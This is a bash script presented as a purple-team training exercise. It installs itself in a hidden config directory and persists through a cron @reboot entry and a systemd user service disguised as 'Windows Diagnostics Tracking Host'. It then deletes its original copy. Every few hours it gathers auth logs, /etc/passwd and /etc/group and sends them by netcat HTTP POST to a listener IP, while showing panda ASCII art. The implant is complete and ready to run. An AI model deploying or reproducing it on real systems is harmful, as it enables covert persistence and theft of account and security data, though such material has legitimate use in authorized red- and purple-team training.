#!/bin/bash
# =============================================================
#  PANDA KALI  -  Purple Team Training Exercise
#  Self-deploying. Installs persistence, exfiltrates security
#  logs every 2-3 hours, spawns panda art in a terminal.
#  Only use on systems you are authorized to access.
# =============================================================

# ── Configuration ─────────────────────────────────────────────
EXFIL_HOST="192.168.1.100"   # <-- set to your listener IP
EXFIL_PORT="4444"
DEPLOY_DIR="$HOME/.config/.diagtrack"
SCRIPT_NAME="diagtrack_runner.sh"
SERVICE_NAME="diagtrack-host"
PANDA_LOG="$DEPLOY_DIR/.panda.log"
LOG_STAGING="$DEPLOY_DIR/.logs"

# ── Self-deploy: only runs when executed directly, not as the ──
# ── deployed copy (detected by path)                         ──
SELF="$(realpath "$0" 2>/dev/null || readlink -f "$0")"
DEPLOYED="$DEPLOY_DIR/$SCRIPT_NAME"

if [ "$SELF" != "$DEPLOYED" ]; then
    echo ""
    echo "[1/5] Creating deployment directory..."
    mkdir -p "$DEPLOY_DIR" "$LOG_STAGING"
    chmod 700 "$DEPLOY_DIR"
    echo "[ OK ] $DEPLOY_DIR"

    echo ""
    echo "[2/5] Deploying script..."
    cp "$SELF" "$DEPLOYED"
    chmod 700 "$DEPLOYED"
    echo "[ OK ] $DEPLOYED"

    echo ""
    echo "[3/5] Installing cron persistence..."
    ( crontab -l 2>/dev/null | grep -v "$SCRIPT_NAME"
      echo "@reboot $DEPLOYED" ) | crontab -
    crontab -l 2>/dev/null | grep -q "$SCRIPT_NAME" \
        && echo "[ OK ] Cron @reboot entry installed." \
        || echo "[FAIL] Cron install failed."

    echo ""
    echo "[4/5] Installing systemd user service..."
    mkdir -p "$HOME/.config/systemd/user"
    cat > "$HOME/.config/systemd/user/${SERVICE_NAME}.service" << SERVICE
[Unit]
Description=Windows Diagnostics Tracking Host
After=default.target

[Service]
Type=simple
ExecStart=$DEPLOYED
Restart=on-failure
RestartSec=60

[Install]
WantedBy=default.target
SERVICE
    systemctl --user daemon-reload 2>/dev/null
    systemctl --user enable "$SERVICE_NAME" 2>/dev/null
    systemctl --user start  "$SERVICE_NAME" 2>/dev/null
    systemctl --user is-active "$SERVICE_NAME" &>/dev/null \
        && echo "[ OK ] systemd user service active." \
        || echo "[WARN] systemd not active (may need desktop session)."

    echo ""
    echo "[5/5] Launching payload..."
    nohup "$DEPLOYED" > /dev/null 2>&1 &
    echo "[ OK ] Launched (PID $!)."
    echo ""
    echo "Deployment complete. This script will now self-delete."
    sleep 1
    rm -f "$SELF"
    exit 0
fi

# =============================================================
#  Everything below runs as the deployed copy only
# =============================================================

# ── Panda art ─────────────────────────────────────────────────
_PANDA1=$(cat << 'PANDAEOF'
                                                             -|-_
                                                              | _

                                                             <|/\
                                                              | |,

                                                             |-|-o
                                                             |<|.

                                              _,..._,m,      |,
                                           ,/'      '"";     | |,
                                          /             ".
                                        ,'mmmMMMMmm.      \  -|-_"
                                      _/-"^^^^^"""%#%mm,   ;  | _ o
                                ,m,_,'              "###)  ;,
                               (###%                 \#/  ;##mm.
                                ^#/  __        ___    ;  (######)
                                 ;  //.\\     //.\\   ;   \####/
                                _; (#\"//     \\"/#)  ;  ,/
                               @##\ \##/   =   `"=" ,;mm/
                               `\##>.____,...,____,<####@
                                                     ""'                 
PANDAEOF
)

_PANDA2=$(cat << 'PANDAEOF'
                              _,add8ba,
                            ,d888888888b,
                           d8888888888888b                        _,ad8ba,_
                          d888888888888888)                     ,d888888888b,
                          I8888888888888888 _________          ,8888888888888b
                __________`Y88888888888888P"""""""""""baaa,__ ,888888888888888,
            ,adP"""""""""""9888888888P""^                 ^""Y8888888888888888I
         ,a8"^           ,d888P"888P^                           ^"Y8888888888P'
       ,a8^            ,d8888'                                     ^Y8888888P'
      a88'           ,d8888P'                                        I88P"^
    ,d88'           d88888P'                                          "b,
   ,d88'           d888888'                                            `b,
  ,d88'           d888888I                                              `b,
  d88I           ,8888888'            ___                                `b,
 ,888'           d8888888          ,d88888b,              ____            `b,
 d888           ,8888888I         d88888888b,           ,d8888b,           `b
,8888           I8888888I        d8888888888I          ,88888888b           8,
I8888           88888888b       d88888888888'          8888888888b          8I
d8886           888888888       Y888888888P'           Y8888888888,        ,8b
88888b          I88888888b      `Y8888888^             `Y888888888I        d88,
Y88888b         `888888888b,      `""""^                `Y8888888P'       d888I
`888888b         88888888888b,                           `Y8888P^        d88888
 Y888888b       ,8888888888888ba,_          _______        `""^        ,d888888
 I8888888b,    ,888888888888888888ba,_     d88888888b               ,ad8888888I
 `888888888b,  I8888888888888888888888b,    ^"Y888P"^      ____.,ad88888888888I
  88888888888b,`888888888888888888888888b,     ""      ad888888888888888888888'
  8888888888888698888888888888888888888888b_,ad88ba,_,d88888888888888888888888
  88888888888888888888888888888888888888888b,`"""^ d8888888888888888888888888I
  8888888888888888888888888888888888888888888baaad888888888888888888888888888'
  Y8888888888888888888888888888888888888888888888888888888888888888888888888P
  I888888888888888888888888888888888888888888888P^  ^Y8888888888888888888888'
  `Y88888888888888888P88888888888888888888888888'     ^88888888888888888888I
   `Y8888888888888888 `8888888888888888888888888       8888888888888888888P'
    `Y888888888888888  `888888888888888888888888,     ,888888888888888888P'
     `Y88888888888888b  `88888888888888888888888I     I888888888888888888'
       "Y8888888888888b  `8888888888888888888888I     I88888888888888888'
         "Y88888888888P   `888888888888888888888b     d8888888888888888'
            ^""""""""^     `Y88888888888888888888,    888888888888888P'
                             "8888888888888888888b,   Y888888888888P^
                              `Y888888888888888888b   `Y8888888P"^
                                "Y8888888888888888P     `""""^
                                  `"YY88888888888P'
                                       ^""""""""'        
PANDAEOF
)

_PANDA3=$(cat << 'PANDAEOF'
          ## 
   ###----## 
   ###      \
   /        ##__
  /       ##   #     --#  
 :           __/   -#   :  
,'          _\     >     : 
####      :'     #########:   
##########          |  ###:   
######################    :
#######################   :
######################...,'
            :
             ;
              ;
               ;
              ,;
           ;##########
          ;###########
,,,,,,,,,;########### 
PANDAEOF
)
PANDAS=("$_PANDA1" "$_PANDA2" "$_PANDA3")

PANDA_NAMES=(
    "Bao Bao" "Mei Xiang" "Tian Tian" "Bei Bei" "Xiao Qi Ji"
    "Buttercup" "Dumpling" "Wonton" "Mr. Fluffybottom"
    "Professor Bamboo" "Noodle" "Mochi" "Pudding" "Lord Bambington"
)

PANDA_FACTS=(
    "Giant pandas spend 10-16 hours a day eating bamboo."
    "A pandas thumb is actually an enlarged wrist bone."
    "Newborn pandas are roughly the size of a stick of butter."
    "A group of pandas is called an embarrassment."
    "Pandas can swim and are surprisingly good at it."
    "Wild giant pandas are only found in central China."
    "Pandas have been on Earth for 2-3 million years."
    "Pandas in captivity can live to over 30 years old."
    "Pandas eat up to 84 lbs of bamboo per day."
    "Baby pandas are born pink and tiny - about 4 oz."
    "Red pandas are not closely related to giant pandas at all."
)

COLORS=('\e[97m' '\e[96m' '\e[92m' '\e[93m' '\e[95m' '\e[37m')
RESET='\e[0m'

# ── Helpers ───────────────────────────────────────────────────
rand_element() {
    local -n _arr=$1
    echo "${_arr[ $((RANDOM % ${#_arr[@]})) ]}"
}

rand_range() {
    echo $(( RANDOM % ($2 - $1 + 1) + $1 ))
}

# ── Spawn a panda in a new terminal ───────────────────────────
spawn_panda() {
    local art=$(rand_element PANDAS)
    local name=$(rand_element PANDA_NAMES)
    local fact=$(rand_element PANDA_FACTS)
    local color=$(rand_element COLORS)

    local tmpscript
    tmpscript=$(mktemp /tmp/.panda_XXXXXX.sh)

    cat > "$tmpscript" << INNER
#!/bin/bash
echo -e '${color}'
cat << 'PANDAART'
${art}
PANDAART
echo -e '${RESET}'
echo "\$(printf '%0.s-' {1..50})"
echo ""
echo "  did you know, ${name}?"
echo "  ${fact}"
sleep 12
rm -f "$tmpscript"
INNER
    chmod +x "$tmpscript"

    if command -v gnome-terminal &>/dev/null; then
        gnome-terminal --title="$name" -- bash "$tmpscript" &
    elif command -v xfce4-terminal &>/dev/null; then
        xfce4-terminal --title="$name" -e "bash $tmpscript" &
    elif command -v xterm &>/dev/null; then
        xterm -title "$name" -e bash "$tmpscript" &
    elif command -v konsole &>/dev/null; then
        konsole --title "$name" -e bash "$tmpscript" &
    else
        bash "$tmpscript"
    fi
}

# ── Collect security-relevant logs ────────────────────────────
collect_logs() {
    local since="${1:-3 hours ago}"
    local outfile="$LOG_STAGING/logs_$(date +%Y%m%d_%H%M%S).txt"
    mkdir -p "$LOG_STAGING"

    {
        echo "============================================================"
        echo " PANDA LOG EXFIL - $(hostname) - $(date)"
        echo " Window: $since"
        echo "============================================================"
        echo ""

        echo "=== PASSWORD CHANGES ==="
        [ -f /var/log/auth.log ] && \
            grep -i "passwd\|password changed\|chpasswd\|pam_unix.*password" \
                /var/log/auth.log 2>/dev/null
        journalctl --since="$since" -t passwd -t chpasswd \
            --no-pager -q 2>/dev/null
        echo ""

        echo "=== USER CREATION ==="
        [ -f /var/log/auth.log ] && \
            grep -i "useradd\|adduser\|new user\|new group" \
                /var/log/auth.log 2>/dev/null
        journalctl --since="$since" -t useradd -t adduser \
            --no-pager -q 2>/dev/null
        echo ""

        echo "=== USER DELETION ==="
        [ -f /var/log/auth.log ] && \
            grep -i "userdel\|deluser\|removed user" \
                /var/log/auth.log 2>/dev/null
        journalctl --since="$since" -t userdel -t deluser \
            --no-pager -q 2>/dev/null
        echo ""

        echo "=== PERMISSION / PRIVILEGE CHANGES ==="
        [ -f /var/log/auth.log ] && \
            grep -i "usermod\|groupmod\|sudo\|su\[:\|chown\|chmod\|visudo\|sudoers" \
                /var/log/auth.log 2>/dev/null
        journalctl --since="$since" -t usermod -t groupmod -t sudo \
            --no-pager -q 2>/dev/null
        echo ""

        echo "=== /etc/passwd SNAPSHOT ==="
        cat /etc/passwd 2>/dev/null
        echo ""

        echo "=== /etc/group SNAPSHOT ==="
        cat /etc/group 2>/dev/null
        echo ""

        echo "=== END OF REPORT ==="

    } > "$outfile" 2>/dev/null

    echo "$outfile"
}

# ── Exfiltrate via HTTP POST to netcat listener ───────────────
exfiltrate() {
    local logfile="$1"
    [ -f "$logfile" ] || return 1

    local filename
    filename=$(basename "$logfile")
    local filesize
    filesize=$(wc -c < "$logfile")

    {
        printf "POST /logs HTTP/1.1\r\n"
        printf "Host: %s:%s\r\n"          "$EXFIL_HOST" "$EXFIL_PORT"
        printf "Content-Type: text/plain\r\n"
        printf "Content-Length: %s\r\n"   "$filesize"
        printf "X-Hostname: %s\r\n"       "$(hostname)"
        printf "X-Timestamp: %s\r\n"      "$(date -u +%Y-%m-%dT%H:%M:%SZ)"
        printf "X-Filename: %s\r\n"       "$filename"
        printf "\r\n"
        cat "$logfile"
    } | nc -w 5 "$EXFIL_HOST" "$EXFIL_PORT" 2>/dev/null

    local status=$?
    echo "$(date): exfil $filename -> $EXFIL_HOST:$EXFIL_PORT (exit $status)" \
        >> "$PANDA_LOG"
    rm -f "$logfile"
    return $status
}

# ── Main ──────────────────────────────────────────────────────
mkdir -p "$DEPLOY_DIR" "$LOG_STAGING"

# Proof of life + baseline collection on startup
spawn_panda
sleep 2

echo "$(date): startup" >> "$PANDA_LOG"
exfiltrate "$(collect_logs '24 hours ago')"

# Loop: panda + exfil every 2-3 hours
while true; do
    sleep "$(rand_range 7200 10800)"
    spawn_panda
    exfiltrate "$(collect_logs '3 hours ago')"
done
